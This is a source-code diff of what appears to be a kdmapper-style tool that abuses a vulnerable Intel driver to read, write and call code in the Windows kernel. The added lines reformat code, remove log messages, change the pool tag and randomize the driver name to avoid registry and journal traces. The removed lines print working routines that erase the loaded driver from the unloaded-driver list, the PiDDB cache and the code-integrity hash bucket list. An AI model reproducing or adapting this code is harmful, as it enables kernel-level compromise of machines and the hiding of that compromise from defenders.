@@ -211,14 +211,14 @@ namespace intel_driver
 		return false;
 	}
 
-	__forceinline HANDLE Load ( )
-	{
+	__forceinline HANDLE Load ( ) {
 		//Randomize name for log in registry keys, usn jornal and other shits
 		memset ( intel_driver::driver_name, 0, sizeof ( intel_driver::driver_name ) );
 		static const char alphanum [ ] =
 			"abcdefghijklmnopqrstuvwxyz"
 			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 		int len = rand ( ) % 20 + 10;
+
 		for ( int i = 0; i < len; ++i )
 			intel_driver::driver_name [ i ] = alphanum [ rand ( ) % ( sizeof ( alphanum ) - 1 ) ];
 
@@ -234,13 +234,11 @@ namespace intel_driver
 		const std::string driver_path = std::string ( temp_directory ) + "\\" + driver_name;
 		std::remove ( driver_path.c_str ( ) );
 
-		if ( !utils::CreateFileFromMemory ( driver_path, reinterpret_cast< const char* >( intel_driver_resource::driver ), sizeof ( intel_driver_resource::driver ) ) )
-		{
+		if ( !utils::CreateFileFromMemory ( driver_path, reinterpret_cast< const char* >( intel_driver_resource::driver ), sizeof ( intel_driver_resource::driver ) ) ) {
 			return nullptr;
 		}
 
-		if ( !RegisterAndStart ( driver_path ) )
-		{
+		if ( !RegisterAndStart ( driver_path ) ) {
 			std::remove ( driver_path.c_str ( ) );
 			return nullptr;
 		}
@@ -248,11 +246,9 @@ namespace intel_driver
 		return CreateFileW ( L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
 	}
 
-	__forceinline void Unload ( HANDLE device_handle )
-	{
-		if ( device_handle && device_handle != INVALID_HANDLE_VALUE ) {
+	__forceinline void Unload ( HANDLE device_handle ) {
+		if ( device_handle && device_handle != INVALID_HANDLE_VALUE )
 			CloseHandle ( device_handle );
-		}
 
 		StopAndRemove ( driver_name );
 
@@ -267,16 +263,17 @@ namespace intel_driver
 		std::ofstream file_ofstream ( driver_path.c_str ( ), std::ios_base::out | std::ios_base::binary );
 		int newFileLen = sizeof ( intel_driver_resource::driver ) + ( ( long long ) rand ( ) % 2348767 + 56725 );
 		BYTE* randomData = new BYTE [ newFileLen ];
-		for ( size_t i = 0; i < newFileLen; i++ ) {
+
+		for ( size_t i = 0; i < newFileLen; i++ )
 			randomData [ i ] = ( BYTE ) ( rand ( ) % 255 );
-		}
-		if ( !file_ofstream.write ( ( char* ) randomData, newFileLen ) )
-		{
+
+		if ( !file_ofstream.write ( ( char* ) randomData, newFileLen ) ) {
 
 		}
 		else {
 
 		}
+
 		file_ofstream.close ( );
 		delete [ ] randomData;
 
@@ -485,14 +482,12 @@ namespace intel_driver
 		// Setup function call
 		HMODULE ntdll = GetModuleHandle ( "ntdll.dll" );
 		if ( ntdll == 0 ) {
-			std::cout << "[-] Failed to load ntdll.dll" << std::endl; //never should happens
 			return false;
 		}
 
 		const auto NtQueryInformationAtom = reinterpret_cast< void* >( GetProcAddress ( ntdll, "NtQueryInformationAtom" ) );
 		if ( !NtQueryInformationAtom )
 		{
-			std::cout << "[-] Failed to get export ntdll.NtQueryInformationAtom" << std::endl;
 			return false;
 		}
 
@@ -503,7 +498,6 @@ namespace intel_driver
 		const uint64_t kernel_NtQueryInformationAtom = GetKernelModuleExport ( device_handle, utils::GetKernelModuleAddress ( "ntoskrnl.exe" ), "NtQueryInformationAtom" );
 		if ( !kernel_NtQueryInformationAtom )
 		{
-			std::cout << "[-] Failed to get export ntoskrnl.NtQueryInformationAtom" << std::endl;
 			return false;
 		}
 
@@ -595,7 +589,7 @@ namespace intel_driver
 
 		uint64_t allocated_pool = 0;
 
-		if ( !CallKernelFunction ( device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'erhT' ) )
+		if ( !CallKernelFunction ( device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'ases' ) )
 			return 0;
 
 		return allocated_pool;
@@ -615,91 +609,6 @@ namespace intel_driver
 		return CallKernelFunction<void> ( device_handle, nullptr, kernel_ExFreePool, address );
 	}
 
-	__forceinline bool ClearMmUnloadedDrivers ( HANDLE device_handle )
-	{
-		ULONG buffer_size = 0;
-		void* buffer = nullptr;
-
-		NTSTATUS status = NtQuerySystemInformation ( static_cast< SYSTEM_INFORMATION_CLASS >( nt::SystemExtendedHandleInformation ), buffer, buffer_size, &buffer_size );
-
-		while ( status == nt::STATUS_INFO_LENGTH_MISMATCH )
-		{
-			VirtualFree ( buffer, 0, MEM_RELEASE );
-
-			buffer = VirtualAlloc ( nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
-			status = NtQuerySystemInformation ( static_cast< SYSTEM_INFORMATION_CLASS >( nt::SystemExtendedHandleInformation ), buffer, buffer_size, &buffer_size );
-		}
-
-		if ( !NT_SUCCESS ( status ) || buffer == 0 )
-		{
-			if ( buffer != 0 )
-				VirtualFree ( buffer, 0, MEM_RELEASE );
-			return false;
-		}
-
-		uint64_t object = 0;
-
-		auto system_handle_inforamtion = static_cast< nt::PSYSTEM_HANDLE_INFORMATION_EX >( buffer );
-
-		for ( auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i )
-		{
-			const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles [ i ];
-
-			if ( current_system_handle.UniqueProcessId != reinterpret_cast< HANDLE >( static_cast< uint64_t >( GetCurrentProcessId ( ) ) ) )
-				continue;
-
-			if ( current_system_handle.HandleValue == device_handle )
-			{
-				object = reinterpret_cast< uint64_t >( current_system_handle.Object );
-				break;
-			}
-		}
-
-		VirtualFree ( buffer, 0, MEM_RELEASE );
-
-		if ( !object )
-			return false;
-
-		uint64_t device_object = 0;
-
-		if ( !ReadMemory ( device_handle, object + 0x8, &device_object, sizeof ( device_object ) ) || !device_object ) {
-			return false;
-		}
-
-		uint64_t driver_object = 0;
-
-		if ( !ReadMemory ( device_handle, device_object + 0x8, &driver_object, sizeof ( driver_object ) ) || !driver_object ) {
-			return false;
-		}
-
-		uint64_t driver_section = 0;
-
-		if ( !ReadMemory ( device_handle, driver_object + 0x28, &driver_section, sizeof ( driver_section ) ) || !driver_section ) {
-			return false;
-		}
-
-		UNICODE_STRING us_driver_base_dll_name = { 0 };
-
-		if ( !ReadMemory ( device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof ( us_driver_base_dll_name ) ) || us_driver_base_dll_name.Length == 0 ) {
-			return false;
-		}
-
-		wchar_t* unloadedName = new wchar_t [ us_driver_base_dll_name.Length ];
-		memset ( unloadedName, 0, us_driver_base_dll_name.Length * sizeof ( wchar_t ) );
-
-		ReadMemory ( device_handle, ( uintptr_t ) us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length * sizeof ( wchar_t ) );
-
-		us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver
-
-		if ( !WriteMemory ( device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof ( us_driver_base_dll_name ) ) ) {
-			return false;
-		}
-
-		delete [ ] unloadedName;
-
-		return true;
-	}
-
 	__forceinline PVOID ResolveRelativeAddress ( HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize ) {
 		ULONG_PTR Instr = ( ULONG_PTR ) Instruction;
 		LONG RipOffset = 0;
@@ -709,202 +618,4 @@ namespace intel_driver
 		PVOID ResolvedAddr = ( PVOID ) ( Instr + InstructionSize + RipOffset );
 		return ResolvedAddr;
 	}
-
-	__forceinline bool ExAcquireResourceExclusiveLite ( HANDLE device_handle, PVOID Resource, BOOLEAN wait )
-	{
-		if ( !Resource )
-			return 0;
-
-		static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport ( device_handle, utils::GetKernelModuleAddress ( "ntoskrnl.exe" ), "ExAcquireResourceExclusiveLite" );
-
-		if ( !kernel_ExAcquireResourceExclusiveLite ) {
-			return 0;
-		}
-
-		BOOLEAN out;
-
-		return ( CallKernelFunction ( device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait ) && out );
-	}
-
-	__forceinline bool ExReleaseResourceLite ( HANDLE device_handle, PVOID Resource )
-	{
-		if ( !Resource )
-			return false;
-
-		static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport ( device_handle, utils::GetKernelModuleAddress ( "ntoskrnl.exe" ), "ExReleaseResourceLite" );
-
-		if ( !kernel_ExReleaseResourceLite ) {
-			return false;
-		}
-
-		return CallKernelFunction<void> ( device_handle, nullptr, kernel_ExReleaseResourceLite, Resource );
-	}
-
-	__forceinline BOOLEAN RtlDeleteElementGenericTableAvl ( HANDLE device_handle, PVOID Table, PVOID Buffer )
-	{
-		if ( !Table )
-			return false;
-
-		static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport ( device_handle, utils::GetKernelModuleAddress ( "ntoskrnl.exe" ), "RtlDeleteElementGenericTableAvl" );
-
-		if ( !kernel_RtlDeleteElementGenericTableAvl ) {
-			return false;
-		}
-
-		BOOLEAN out;
-
-		return ( CallKernelFunction ( device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer ) && out );
-	}
-
-	__forceinline PiDDBCacheEntry* LookupEntry ( HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp ) {
-		PiDDBCacheEntry* firstEntry;
-		if ( !ReadMemory ( device_handle, ( uintptr_t ) PiDDBCacheTable + ( offsetof ( struct _RTL_AVL_TABLE, BalancedRoot.RightChild ) ), &firstEntry, sizeof ( _RTL_BALANCED_LINKS* ) ) ) {
-			return nullptr;
-		}
-
-		( *( uintptr_t* ) &firstEntry ) += sizeof ( RTL_BALANCED_LINKS );
-
-		PiDDBCacheEntry* cache_entry;
-		if ( !ReadMemory ( device_handle, ( uintptr_t ) firstEntry + ( offsetof ( struct _PiDDBCacheEntry, List.Flink ) ), &cache_entry, sizeof ( _LIST_ENTRY* ) ) ) {
-			return nullptr;
-		}
-
-		while ( TRUE ) {
-			ULONG itemTimeDateStamp = 0;
-			if ( !ReadMemory ( device_handle, ( uintptr_t ) cache_entry + ( offsetof ( struct _PiDDBCacheEntry, TimeDateStamp ) ), &itemTimeDateStamp, sizeof ( ULONG ) ) ) {
-				return nullptr;
-			}
-			if ( itemTimeDateStamp == timestamp ) {
-				return cache_entry;
-			}
-			if ( ( uintptr_t ) cache_entry == ( uintptr_t ) firstEntry ) {
-				break;
-			}
-			if ( !ReadMemory ( device_handle, ( uintptr_t ) cache_entry + ( offsetof ( struct _PiDDBCacheEntry, List.Flink ) ), &cache_entry, sizeof ( _LIST_ENTRY* ) ) ) {
-				return nullptr;
-			}
-		}
-		return nullptr;
-	}
-
-	__forceinline bool ClearPiDDBCacheTable ( HANDLE device_handle ) { //PiDDBCacheTable added on LoadDriver
-
-		uint64_t ntoskrnl = utils::GetKernelModuleAddress ( "ntoskrnl.exe" );
-
-		PiDDBLockPtr = FindPatternInSectionAtKernel ( device_handle, ( char* ) "PAGE", ntoskrnl, ( PUCHAR ) "\x81\xFB\x6C\x03\x00\xC0\x0F\x84\x00\x00\x00\x00\x48\x8D\x0D", ( char* ) "xxxxxxxx????xxx" ); // 81 FB 6C 03 00 C0 0F 84 ? ? ? ? 48 8D 0D  update for build 21286 etc...
-		PiDDBCacheTablePtr = FindPatternInSectionAtKernel ( device_handle, ( char* ) "PAGE", ntoskrnl, ( PUCHAR ) "\x66\x03\xD2\x48\x8D\x0D", ( char* ) "xxxxxx" );
-		if ( PiDDBLockPtr == NULL || PiDDBCacheTablePtr == NULL ) {
-			return false;
-		}
-
-		PVOID PiDDBLock = ResolveRelativeAddress ( device_handle, ( PVOID ) PiDDBLockPtr, 15, 19 );
-		PRTL_AVL_TABLE PiDDBCacheTable = ( PRTL_AVL_TABLE ) ResolveRelativeAddress ( device_handle, ( PVOID ) PiDDBCacheTablePtr, 6, 10 );
-
-
-		SetMemory ( device_handle, ( uintptr_t ) PiDDBCacheTable + ( offsetof ( struct _RTL_AVL_TABLE, TableContext ) ), 1, sizeof ( PVOID ) );
-
-		if ( !ExAcquireResourceExclusiveLite ( device_handle, PiDDBLock, true ) ) {
-			return false;
-		}
-
-		// search our entry in the table
-		PiDDBCacheEntry* pFoundEntry = ( PiDDBCacheEntry* ) LookupEntry ( device_handle, PiDDBCacheTable, iqvw64e_timestamp );
-		if ( pFoundEntry == nullptr ) {
-			ExReleaseResourceLite ( device_handle, PiDDBLock );
-			return false;
-		}
-
-		// first, unlink from the list
-		PLIST_ENTRY prev;
-		if ( !ReadMemory ( device_handle, ( uintptr_t ) pFoundEntry + ( offsetof ( struct _PiDDBCacheEntry, List.Blink ) ), &prev, sizeof ( _LIST_ENTRY* ) ) ) {
-			ExReleaseResourceLite ( device_handle, PiDDBLock );
-			return false;
-		}
-		PLIST_ENTRY next;
-		if ( !ReadMemory ( device_handle, ( uintptr_t ) pFoundEntry + ( offsetof ( struct _PiDDBCacheEntry, List.Flink ) ), &next, sizeof ( _LIST_ENTRY* ) ) ) {
-			ExReleaseResourceLite ( device_handle, PiDDBLock );
-			return false;
-		}
-
-		if ( !WriteMemory ( device_handle, ( uintptr_t ) prev + ( offsetof ( struct _LIST_ENTRY, Flink ) ), &next, sizeof ( _LIST_ENTRY* ) ) ) {
-			ExReleaseResourceLite ( device_handle, PiDDBLock );
-			return false;
-		}
-		if ( !WriteMemory ( device_handle, ( uintptr_t ) next + ( offsetof ( struct _LIST_ENTRY, Blink ) ), &prev, sizeof ( _LIST_ENTRY* ) ) ) {
-			ExReleaseResourceLite ( device_handle, PiDDBLock );
-			return false;
-		}
-
-		// then delete the element from the avl table
-		if ( !RtlDeleteElementGenericTableAvl ( device_handle, PiDDBCacheTable, pFoundEntry ) ) {
-			ExReleaseResourceLite ( device_handle, PiDDBLock );
-			return false;
-		}
-
-		// release the ddb resource lock
-		ExReleaseResourceLite ( device_handle, PiDDBLock );
-
-		return true;
-	}
-
-	__forceinline bool ClearKernelHashBucketList ( HANDLE device_handle ) {
-		std::string dname ( driver_name );
-		std::wstring wdname ( dname.begin ( ), dname.end ( ) );
-		wdname = L"\\" + wdname;
-		uint64_t ci = utils::GetKernelModuleAddress ( "ci.dll" );
-
-		auto sig = FindPatternInSectionAtKernel ( device_handle, ( char* ) "PAGE", ci, PUCHAR ( "\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00" ), ( char* ) "xxx????x?xxxxxxx" );
-		if ( !sig ) {
-			return false;
-		}
-		auto sig2 = FindPatternAtKernel ( device_handle, ( uintptr_t ) sig - 50, 50, PUCHAR ( "\x48\x8D\x0D" ), ( char* ) "xxx" );
-		if ( !sig2 ) {
-			return false;
-		}
-		const auto g_KernelHashBucketList = ResolveRelativeAddress ( device_handle, ( PVOID ) sig, 3, 7 );
-		const auto g_HashCacheLock = ResolveRelativeAddress ( device_handle, ( PVOID ) sig2, 3, 7 );
-		if ( !g_KernelHashBucketList || !g_HashCacheLock )
-		{
-			return false;
-		}
-
-		if ( !ExAcquireResourceExclusiveLite ( device_handle, g_HashCacheLock, true ) ) {
-			return false;
-		}
-
-		HashBucketEntry* prev = ( HashBucketEntry* ) g_KernelHashBucketList;
-		HashBucketEntry* entry = 0;
-		ReadMemory ( device_handle, ( uintptr_t ) prev, &entry, sizeof ( entry ) );
-		while ( entry ) {
-			wchar_t* wsNamePtr = 0;
-			USHORT wsNameLen = 0;
-			ReadMemory ( device_handle, ( uintptr_t ) entry + offsetof ( HashBucketEntry, DriverName.Buffer ), &wsNamePtr, sizeof ( wsNamePtr ) );
-			ReadMemory ( device_handle, ( uintptr_t ) entry + offsetof ( HashBucketEntry, DriverName.Length ), &wsNameLen, sizeof ( wsNameLen ) );
-
-			wchar_t* wsName = new wchar_t [ wsNameLen ];
-			memset ( wsName, 0, wsNameLen * sizeof ( wchar_t ) );
-			ReadMemory ( device_handle, ( uintptr_t ) wsNamePtr, wsName, wsNameLen * sizeof ( wchar_t ) );
-
-			if ( std::wstring ( wsName ).find ( wdname ) != std::wstring::npos ) {
-				HashBucketEntry* Next = 0;
-
-				ReadMemory ( device_handle, ( uintptr_t ) entry, &Next, sizeof ( Next ) );
-				WriteMemory ( device_handle, ( uintptr_t ) prev, &Next, sizeof ( Next ) );
-				FreePool ( device_handle, ( uintptr_t ) entry );
-				ExReleaseResourceLite ( device_handle, g_HashCacheLock );
-
-				delete [ ] wsName;
-
-				return true;
-			}
-
-			prev = entry;
-			delete [ ] wsName;
-			//read next
-			ReadMemory ( device_handle, ( uintptr_t ) entry, &entry, sizeof ( entry ) );
-		}
-
-		ExReleaseResourceLite ( device_handle, g_HashCacheLock );
-		return false;
-	}	
 }
